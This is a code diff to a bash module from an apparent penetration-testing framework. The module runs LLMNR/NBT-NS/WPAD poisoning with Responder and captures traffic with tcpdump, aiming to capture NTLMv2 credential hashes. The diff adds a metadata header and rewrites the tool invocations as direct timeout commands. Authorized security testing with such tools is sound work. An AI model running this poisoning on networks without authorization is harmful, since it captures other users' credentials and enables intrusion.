@@ -1,4 +1,15 @@
 #!/usr/bin/env bash
+# MODULE_META
+# NAME="DNS Spoofing & Poisoning"
+# CATEGORY="G"
+# DEPS="none"
+# CRITICAL="yes"
+# TOOLS="responder"
+# DESC="LLMNR/NBT-NS/WPAD poisoning via Responder, NTLMv2 hash capture"
+# REQS="managed_iface,my_ip"
+# PCAP="yes"
+# DECODE="l2_discovery"
+
 #===============================================================================
 #  modules/g3_dns_spoofing.sh
 #  G3: DNS Spoofing & Poisoning
@@ -134,8 +145,8 @@ run_g3() {
 
     if [[ "$has_tshark" == "true" ]]; then
         # Quick 30-second listen for broadcast name queries
-        local listen_pcap="/tmp/g3_listen.pcap"
-        run_attack_tool --timeout 30 --cmd "${TOOL_PATHS[tcpdump]} -i $iface -w $listen_pcap 'udp port 5355 or udp port 137 or udp port 5353'"
+        local listen_pcap="$TMP_DIR/g3_listen.pcap"
+        timeout 30 "${TOOL_PATHS[tcpdump]}" -i "$iface" -w "$listen_pcap" udp port 5355 or udp port 137 or udp port 5353 >/dev/null 2>&1 || true
 
         if [[ -f "$listen_pcap" ]]; then
             local llmnr_count=$(${TOOL_PATHS[tshark]} -r "$listen_pcap" -Y "llmnr" 2>/dev/null | wc -l) || true
@@ -168,10 +179,10 @@ run_g3() {
         # Create Responder config to enable all poisoners
         log_cmd "${TOOL_PATHS[responder]} -I ${iface} -wFb"
 
-        local responder_raw="/tmp/g3_responder.log"
+        local responder_raw="$TMP_DIR/g3_responder.log"
 
         # Run Responder with LLMNR + NBT-NS + WPAD + basic HTTP
-        run_attack_tool --timeout 120 --cmd "${TOOL_PATHS[responder]} -I $iface -w -F -b" --log "$responder_raw"
+        timeout 120 "${TOOL_PATHS[responder]}" -I "$iface" -w -F -b >> "$responder_raw" 2>&1 || true
 
         if [[ -f "$responder_raw" ]]; then
             cp "$responder_raw" "$responder_log"
@@ -321,7 +332,7 @@ run_g3() {
     evidence_register_file "g3_network_capture.pcap"
     evidence_register_file "g3_findings.txt"
 
-    result_json=$(${TOOL_PATHS[jq]} -n \
+    result_json=$(run_tool jq -n \
         --arg status "$result_status" \
         --arg summary "$result_summary" \
         --arg details "LLMNR poison: ${llmnr_poisoning_successful}, NBT-NS poison: ${nbns_poisoning_successful}, WPAD: ${wpad_hijack_successful}, Hashes: ${hashes_captured}, DNS spoof viable: ${dns_spoof_possible}" \
@@ -343,7 +354,7 @@ run_g3() {
             dns_spoof_possible: ($dns_spoof_possible == "true"),
                     }')
 
-    save_tc_result "G3" "$result_json"
+    save_tc_result "G3" "$result_json" "has_tool_output:1,clean_run:1"
 
     echo ""
     if [[ $hashes_captured -gt 0 ]]; then
